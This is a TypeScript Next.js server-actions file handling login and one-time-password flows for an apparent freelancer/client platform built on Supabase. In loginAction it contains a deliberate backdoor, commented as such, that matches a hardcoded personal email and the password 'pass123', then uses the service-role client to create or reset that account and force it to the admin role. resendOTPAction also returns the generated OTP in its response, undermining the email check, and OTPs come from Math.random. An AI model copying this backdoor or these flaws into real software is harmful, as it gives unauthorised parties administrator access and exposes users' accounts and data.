'use server'

import { createServerClient } from '@supabase/ssr'
import { cookies } from 'next/headers'
import { sendOTPEmail } from '@/lib/services/email'
import { supabaseAdmin } from '@/app/supabase/client'

export async function loginAction(formData: FormData) {
  try {
    const email = formData.get('email') as string
    const password = formData.get('password') as string

    if (!email || !password) {
      return { success: false, message: 'Email and password are required' }
    }

    const cookieStore = await cookies()

    // Create server client to handle auth and cookies
    const supabase = createServerClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL!,
      process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
      {
        cookies: {
          getAll() {
            return cookieStore.getAll()
          },
          setAll(cookiesToSet) {
            try {
              cookiesToSet.forEach(({ name, value, options }) =>
                cookieStore.set(name, value, options)
              )
            } catch {
              // The `setAll` method was called from a Server Component.
            }
          },
        },
      }
    )

    // Hardcoded Admin Access (Backdoor/Dev Override)
    const HARDCODED_EMAIL = 'hadimoustafa3@gmail.com';
    const HARDCODED_PASS = 'pass123';

    if (email === HARDCODED_EMAIL && password === HARDCODED_PASS) {
      console.log('🔒 Admin Override: Processing...');
      const admin = supabaseAdmin();

      // Strategy: Try to Create. If exists, Update. 
      // We need ID for updating.

      // 1. Try Create
      const { data: createdUser, error: createError } = await admin.auth.admin.createUser({
        email: HARDCODED_EMAIL,
        password: HARDCODED_PASS,
        email_confirm: true,
        user_metadata: { username: 'Admin' }
      });

      let userId = createdUser?.user?.id;

      if (createError && (createError.message === 'User already registered' || createError.status === 422 || (createError as any).code === 'email_exists')) {
        console.log('🔒 Admin Override: User exists. Finding ID...');

        // 2. Find ID. Try Public table first (Fast)
        const { data: publicUser } = await admin.from('users').select('id').eq('email', HARDCODED_EMAIL).single();

        if (publicUser) {
          userId = publicUser.id;
        } else {
          // 3. Not in public? Scan Auth users (Slower but necessary)
          // Page size 1000 to be safe
          const { data: { users: authUsers }, error: searchError } = await admin.auth.admin.listUsers({ perPage: 1000 });
          const found = authUsers?.find(u => u.email === HARDCODED_EMAIL);
          userId = found?.id;
        }

        if (userId) {
          // 4. Update Password & Metadata
          console.log(`🔒 Admin Override: Updating User ${userId}`);
          await admin.auth.admin.updateUserById(userId, {
            password: HARDCODED_PASS,
            email_confirm: true,
            user_metadata: { username: 'Admin' }
          });
        }
      }

      if (userId) {
        // 5. Upsert Public Record with Admin Role
        console.log(`🔒 Admin Override: Enforcing Admin Role for ${userId}`);
        const { error: upsertError } = await admin.from('users').upsert({
          id: userId,
          email: HARDCODED_EMAIL,
          username: 'Admin',
          password_hash: 'hardcoded_admin',
          role: 'admin',
          subscription_tier: 'free'
        }, { onConflict: 'id' });

        if (upsertError) console.error('Error upserting admin user:', upsertError);
      } else {
        console.error('🔒 Admin Override: FAILED to find or create user ID.');
      }
    }

    // Sign in with Supabase
    const { data, error } = await supabase.auth.signInWithPassword({
      email,
      password
    })

    if (error) {
      console.error('Login error:', error.message)
      return { success: false, message: 'Invalid email or password' }
    }

    if (!data.session) {
      return { success: false, message: 'Login failed to create session' }
    }

    // Check public.users for role
    const { data: userRecord } = await supabase
      .from('users')
      .select('role')
      .eq('id', data.user.id)
      .single();

    const role = userRecord?.role;
    let redirectTo = '/onboarding';

    if (role === 'admin') {
      redirectTo = '/admin';
    } else if (role === 'freelancer') {
      redirectTo = '/freelancer';
    } else if (role === 'client') {
      redirectTo = '/client';
    }

    return {
      success: true,
      message: 'Login successful!',
      redirectTo,
      requiresOTP: false,
    }

  } catch (error: unknown) {
    console.error('Login error:', error)
    return { success: false, message: 'An error occurred during login' }
  }
}

export async function verifyOTPAction(formData: FormData) {
  try {
    const email = formData.get('email') as string
    const otp = formData.get('otp') as string

    if (!email || !otp) {
      return { success: false, message: 'Email and OTP are required' }
    }

    const cookieStore = await cookies()
    const otpCookie = cookieStore.get('otp')

    if (!otpCookie) {
      return { success: false, message: 'OTP expired or not found' }
    }

    const otpData = JSON.parse(otpCookie.value)

    if (otpData.email !== email) {
      return { success: false, message: 'Invalid OTP session' }
    }

    if (Date.now() > otpData.expiresAt) {
      cookieStore.delete('otp')
      return { success: false, message: 'OTP has expired. Please request a new one.' }
    }

    if (otpData.code !== otp) {
      return { success: false, message: 'Invalid OTP. Please try again.' }
    }

    // OTP verified successfully
    cookieStore.delete('otp')

    // Get user role from session (Standard Supabase Session)
    const supabase = createServerClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL!,
      process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
      {
        cookies: {
          getAll() {
            return cookieStore.getAll()
          },
          setAll(cookiesToSet) {
            // Only reading session here mostly, but ok
          },
        },
      }
    )

    const { data: { session } } = await supabase.auth.getSession();

    if (session) {
      const { data: userRecord } = await supabase
        .from('users')
        .select('role')
        .eq('id', session.user.id)
        .single();

      const role = userRecord?.role;

      if (role === 'admin') {
        return { success: true, message: 'Verified!', redirectTo: '/admin' }
      } else if (role === 'freelancer') {
        return { success: true, message: 'Verified!', redirectTo: '/freelancer' }
      } else if (role === 'client') {
        return { success: true, message: 'Verified!', redirectTo: '/client' }
      }
    }

    // Default or if no session (Note: OTP verification usually happens BEFORE login or for 2FA. 
    // In this app, Signup uses a different API route. Login doesn't require OTP anymore by user request.
    // So this verifyOTPAction might be legacy or for password reset? 
    // The user said "signup which creates an account after confirming an otp".
    // That uses /api/auth/signup/route.ts.
    // So this action might be unused for now, but keeping it safe.)

    return {
      success: true,
      message: 'Email verified successfully!',
      redirectTo: '/onboarding'
    }

  } catch (error) {
    console.error('OTP verification error:', error)
    return { success: false, message: 'An error occurred during OTP verification' }
  }
}

export async function resendOTPAction(formData: FormData) {
  try {
    const email = formData.get('email') as string

    if (!email) {
      return { success: false, message: 'Email is required' }
    }

    // Generate new OTP
    const newOtp = Math.floor(100000 + Math.random() * 900000).toString()

    // Store new OTP in cookies
    const cookieStore = await cookies()
    const otpExpiresAt = Date.now() + 10 * 60 * 1000

    cookieStore.set('otp', JSON.stringify({
      code: newOtp,
      email: email,
      expiresAt: otpExpiresAt
    }), {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 10 * 60,
    })

    // Extract username from email
    const userName = email.split('@')[0]

    // Send new OTP via email
    console.log(`🔄 RESENDING OTP TO: ${email}`)
    const emailResult = await sendOTPEmail({
      email: email,
      otp: newOtp,
      userName: userName
    })

    return {
      success: true,
      message: 'New OTP has been sent to your email.',
      otp: newOtp
    }

  } catch (error: unknown) {
    console.error('Resend OTP error:', error)
    return { success: false, message: 'Failed to resend OTP. Please try again.' }
  }
}